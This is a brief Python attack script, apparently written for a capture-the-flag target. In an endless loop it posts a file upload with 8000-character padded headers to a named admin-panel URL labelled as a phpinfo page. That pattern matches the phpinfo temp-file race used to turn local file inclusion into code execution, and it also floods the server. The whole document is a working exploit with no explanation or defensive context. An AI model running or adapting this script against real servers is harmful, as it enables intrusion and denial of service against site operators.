#!/usr/bin/python3 -W ignore

import requests

files = {
    'u1f383': open('large_data.txt', 'rb')
}
padding = 'a'*8000
headers = {
    'HTTP_ACCEPT': padding,
    'HTTP_USER_AGENT': padding,
    'HTTP_ACCEPT_LANGUAGE': padding,
    'HTTP_PRAGMA': padding,
}
phpinfo = 'https://gallery.nctfu.itac.club/adminpanel.php'

while True:
    r = requests.post(phpinfo, verify=False, files=files, headers=headers)

